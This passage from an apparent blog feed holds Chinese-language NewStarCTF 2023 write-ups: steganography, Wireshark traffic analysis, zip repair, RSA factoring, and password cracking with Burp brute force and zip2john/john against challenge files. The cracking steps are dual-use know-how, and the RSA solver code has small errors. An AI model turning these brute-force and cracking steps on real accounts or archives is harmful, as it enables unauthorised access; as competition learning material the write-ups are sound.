历史记录：</p>\n<p><img data-src=\"image-20231004111709678.png\" alt=\"image-20231004111709678\"></p>\n<p>该登录密码采用 弱密码，并且，将 newstar 和 newstar2023 追加到了密码本中。先尝试用这两个新加入的密码进行登录 admin，结果都不对。利用 Burp 进行爆破，得到密码为 000000，登录：</p>\n<p><img data-src=\"image-20231004121113786.png\" alt=\"image-20231004121113786\"></p>\n<p>在 302 请求页面中获得到 flag ：  <code>flag&#123;4b723bc2-fc05-4d41-b7dd-f62ffa244f47&#125;</code></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/",
            "url": "http://yanagi-kon.github.io/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/",
            "title": "NewStarCTF 2023 公开赛道 MISC",
            "date_published": "2023-10-02T08:45:00.000Z",
            "content_html": "<h1 id=\"newstarctf-2023-公开赛道-misc\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-misc\">#</a> NewStarCTF 2023 公开赛道 MISC</h1>\n<h2 id=\"cyberchefs-secret\"><a class=\"markdownIt-Anchor\" href=\"#cyberchefs-secret\">#</a> CyberChef’s Secret</h2>\n<p>题目如下所示：</p>\n<pre><code>来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)\nM5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=\n</code></pre>\n<p>本题使用 CyberChef 即可得知答案：</p>\n<p><img data-src=\"image-20231001202517937.png\" alt=\"image-20231001202517937\"></p>\n<p>所以 flag 为  <code>flag&#123;Base_15_S0_Easy_^_^&#125;</code></p>\n<h2 id=\"机密图片\"><a class=\"markdownIt-Anchor\" href=\"#机密图片\">#</a> 机密图片</h2>\n<p>题目给出了一个二维码如下所示：</p>\n<p><img data-src=\"secret.png\" alt=\"secret\"></p>\n<p>扫描之后只有一串文字，考虑到题目提示，该图片一定隐写了相关信息。使用 Stegsolve 工具进行解析：</p>\n<p><img data-src=\"image-20231002144642640.png\" alt=\"image-20231002144642640\"></p>\n<p>选择 Analyse，Data Extract ，RGB 选择 0，其余默认，点击 Preview 进行提取信息，将页面拉到最低位即可得到 flag：</p>\n<p><img data-src=\"image-20231002144844339.png\" alt=\"image-20231002144844339\"></p>\n<p><code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p>\n<h2 id=\"流量鲨鱼\"><a class=\"markdownIt-Anchor\" href=\"#流量鲨鱼\">#</a> 流量！鲨鱼！</h2>\n<p><strong>本题目给出了一个 pcap 文件，考察对 WireShark 的使用，以及 HTTP 流量分析</strong></p>\n<p>使用 wireshark 进行处理如下，含有大量的目录扫描爆破流量</p>\n<p><img data-src=\"image-20231002145711916.png\" alt=\"image-20231002145711916\"></p>\n<pre><code>使用Wireshark的过滤器来过滤掉干扰的流量\nhttp &amp;&amp; http.response.code == 200\n</code></pre>\n<p><img data-src=\"image-20231002150023999.png\" alt=\"image-20231002150023999\"></p>\n<p>提取出 HTTP 相应数据：</p>\n<pre><code>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=\n</code></pre>\n<p>利用 cyberchef 得到最终的结果（两次 Base64 加密）</p>\n<p><img data-src=\"image-20231002150204398.png\" alt=\"image-20231002150204398\"></p>\n<p><code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p>\n<h2 id=\"压缩包们\"><a class=\"markdownIt-Anchor\" href=\"#压缩包们\">#</a> 压缩包们</h2>\n<p>题目给了一个没有文件格式的文件，task_1，</p>\n<p><strong>考点：Zip 文件头修复、Zip 压缩包爆破</strong></p>\n<p>一个 Zip 文件由三个部分组成：<strong>压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</strong></p>\n<p>压缩源文件数据区：</p>\n<pre><code>50 4B 03 04：这是头文件标记（0x04034b50） \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密） \n08 00：压缩方式 \n5A 7E：最后修改文件时间 \nF7 46：最后修改文件日期 \n16 B5 80 14：CRC-32校验（1480B516） \n19 00 00 00：压缩后尺寸（25） \n17 00 00 00：未压缩尺寸（23） \n07 00：文件名长度 \n00 00：扩展记录长度 \n6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 \n压缩源文件目录区： \n50 4B 01 02：目录中文件文件头标记(0x02014b50) \n3F 00：压缩使用的 pkware 版本 \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） \n08 00：压缩方式 \n5A 7E：最后修改文件时间 \nF7 46：最后修改文件日期 \n16 B5 80 14：CRC-32校验（1480B516） \n19 00 00 00：压缩后尺寸（25） \n17 00 00 00：未压缩尺寸（23） \n07 00：文件名长度 \n24 00：扩展字段长度 \n00 00：文件注释长度 \n00 00：磁盘开始号 \n00 00：内部文件属性 \n20 00 00 00：外部文件属性 \n00 00 00 00：局部头部偏移量 \n6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 \n</code></pre>\n<p>压缩源文件目录结束标志：</p>\n<pre><code>50 4B 05 06：目录结束标记 \n00 00：当前磁盘编号 \n00 00：目录区开始磁盘编号 \n01 00：本磁盘上纪录总数 \n01 00：目录区中纪录总数 \n59 00 00 00：目录区尺寸大小 \n3E 00 00 00：目录区对第一张磁盘的偏移量 \n00 00：ZIP 文件注释长度\n</code></pre>\n<p>使用 010editor 打开文件如下所示：</p>\n<p><img data-src=\"image-20231002153058559.png\" alt=\"image-20231002153058559\"></p>\n<p>将前 4 位更改为如下所示，并将文件更改为 zip 文件。</p>\n<pre><code>50 4B 03 04\n</code></pre>\n<p>将文件解压缩后得到 flag.zip 文件，flag.zip 文件解压需要密码，通过 binwalk 发现存在文件注释：</p>\n<p><img data-src=\"image-20231002153942872.png\" alt=\"image-20231002153942872\"></p>\n<pre><code>SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==\n</code></pre>\n<p>利用 Base64 解码得到： <code>I like six-digit numbers because they are very concise and easy to remember.</code> ，说明密码位数为 6，可以利用爆破进行破解。我们使用 <strong>john</strong> 进行破解（fcrackzip 解不开，都说不是加密对象）：</p>\n<p>首先使用以下命令，获得 zip 的中间 Hash 文件 flag.hash</p>\n<pre><code>zip2john flag.zip &gt; flag.hash\n</code></pre>\n<p>再利用  <code>john flag.hash</code>   进行破解得到如下：</p>\n<p><img data-src=\"image-20231002160943962.png\" alt=\"image-20231002160943962\"></p>\n<p>因而密码为  <code>232311</code> ，解压缩 flag.zip 文件得到 flag 文件： <code>flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</code></p>\n<h2 id=\"空白格\"><a class=\"markdownIt-Anchor\" href=\"#空白格\">#</a> 空白格</h2>\n<p>题目给出了一个 white.zip 文件</p>\n<p><strong>考点：WhiteSpace 语言</strong></p>\n<p>解压后是一个 txt 文件，里面没有任何内容：</p>\n<p><img data-src=\"image-20231002161317063.png\" alt=\"image-20231002161317063\"></p>\n<p>该题考察的是 WhiteSpace 语言，将 txt 中的内容全选复制，利用<span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWk1YXJkLmdpdGh1Yi5pby93aGl0ZXNwYWNlLz9hY2Nlc3NUb2tlbj1leUpoYkdjaU9pSklVekkxTmlJc0ltdHBaQ0k2SW1SbFptRjFiSFFpTENKMGVYQWlPaUpLVjFRaWZRLmV5SmxlSEFpT2pFMk9UWXlNVEkzT0Rnc0ltWnBiR1ZIVlVsRUlqb2lXRXR4TkRJeFJVSkxla1o1VW5wQlRpSXNJbWxoZENJNk1UWTVOakl4TWpRNE9Dd2lhWE56SWpvaWRYQnNiMkZrWlhKZllXTmpaWE56WDNKbGMyOTFjbU5sSWl3aWRYTmxja2xrSWpvdE9ESTROamczT1RRNU5YMC5tcktuOVItMS1zOW44bWhCcVc3bWIyR3RDa3p2N1hZMjI5VFlPRFpUV0s0\">在线网站</span>在线运行：</p>\n<p><img data-src=\"image-20231002161549733.png\" alt=\"image-20231002161549733\"></p>\n<p>得到 flag 为  <code>flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</code></p>\n<h2 id=\"隐秘的眼睛\"><a class=\"markdownIt-Anchor\" href=\"#隐秘的眼睛\">#</a> 隐秘的眼睛</h2>\n<p>题目给出了一个压缩文件，其中有眼睛图片。</p>\n<p><strong>考点：SlientEye 隐写</strong></p>\n<p>使用 SlientEye 工具进行 Decode 即可获得 flag：</p>\n<p><img data-src=\"image-20231002164212579.png\" alt=\"image-20231002164212579\"></p>\n<p>flag 为： <code>flag&#123;R0ck1ng_y0u_63b0dc13a591&#125;</code></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/01/BUUCTF%E2%80%94BABYRSA/",
            "url": "http://yanagi-kon.github.io/2023/10/01/BUUCTF%E2%80%94BABYRSA/",
            "title": "NewStarCTF 2023 公开赛道 Crypto题目 week1",
            "date_published": "2023-10-01T11:28:00.000Z",
            "content_html": "<h2 id=\"buuctf-crypto-babyrsa-task_4\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyrsa-task_4\">#</a> BUUCTF - Crypto babyrsa task_4</h2>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_prime</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        res <span class=\"token operator\">*=</span> getPrime<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    n <span class=\"token operator\">=</span> gen_prime<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></pre></td></tr></table></figure><p>利用在线网站可以将所给的 n 分解素数为以下 15 个：</p>\n<pre><code>2217990919\n2338725373\n2370292207\n2463878387\n2706073949\n2794985117\n2804303069\n2923072267\n2970591037\n3207148519\n3654864131\n3831680819\n3939901243\n4093178561\n4278428893\n</code></pre>\n<p>公钥如上</p>\n<p>n = 以上公钥相乘</p>\n<p>phi = 17290065983330319066216184030777067976382697670733255200004943703459332462321021486252411405242719735544959857825124088104221030960082400051200</p>\n<p>e = 65537</p>\n<p>d * e mod phi = 1 即 由相关数学概念可知，d 是 e 的逆元，标记为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding=\"application/x-tex\">e^{-1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span>,</p>\n<p>利用 扩展欧几里得算法 和 求解逆元算法</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extended_gcd</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> b <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> gcd<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> x <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">//</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> y</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_modulo</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> inverse<span class=\"token punctuation\">,</span> _ <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> gcd <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"The inverse does not exist.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> inverse <span class=\"token operator\">%</span> p</pre></td></tr></table></figure><p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extended_gcd</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> b <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> gcd<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> x <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">//</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> y</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_modulo</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> inverse<span class=\"token punctuation\">,</span> _ <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> gcd <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"The inverse does not exist.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> inverse <span class=\"token operator\">%</span> p</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fastExpMod</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>               <span class=\"token comment\">#快速幂</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> e <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token comment\"># ei = 1, then mul</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>result <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> m</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        e <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\"># b, b^2, b^4, b^8, ... , b^(2^n)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        b <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> m</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>n1 <span class=\"token operator\">=</span> <span class=\"token number\">2217990919</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>n2 <span class=\"token operator\">=</span> <span class=\"token number\">2338725373</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>n3 <span class=\"token operator\">=</span> <span class=\"token number\">2370292207</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>n4 <span class=\"token operator\">=</span> <span class=\"token number\">2463878387</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>n5 <span class=\"token operator\">=</span> <span class=\"token number\">2706073949</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>n6 <span class=\"token operator\">=</span> <span class=\"token number\">2794985117</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>n7 <span class=\"token operator\">=</span> <span class=\"token number\">2804303069</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>n8 <span class=\"token operator\">=</span> <span class=\"token number\">2923072267</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>n9 <span class=\"token operator\">=</span> <span class=\"token number\">2970591037</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>n10 <span class=\"token operator\">=</span> <span class=\"token number\">3207148519</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>n11 <span class=\"token operator\">=</span> <span class=\"token number\">3654864131</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>n12 <span class=\"token operator\">=</span> <span class=\"token number\">3831680819</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>n13 <span class=\"token operator\">=</span> <span class=\"token number\">3939901243</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>n14 <span class=\"token operator\">=</span> <span class=\"token number\">4093178561</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>n15 <span class=\"token operator\">=</span> <span class=\"token number\">4278428893</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>n1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n2<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n3<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n4<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n5<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n6<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n7<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n8<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n9<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n10<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n11<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n12<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n13<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n14<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n15<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>d <span class=\"token operator\">=</span> inverse_modulo<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"The inverse of </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> modulo </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>phi<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> is </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>inverse<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>m <span class=\"token operator\">=</span> fastExpMod<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>flag 为： <code>flag&#123;us4_s1ge_t0_cal_phI&#125;</code></p>\n<h2 id=\"buuctf-crypto-small-d-task_5\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-small-d-task_5\">#</a> BUUCTF - Crypto small d  task_5</h2>\n<p>原题目如下：</p>\n<p><img data-src=\"image-20230928143400881.png\" alt=\"image-20230928143400881\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>d <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> <span class=\"token 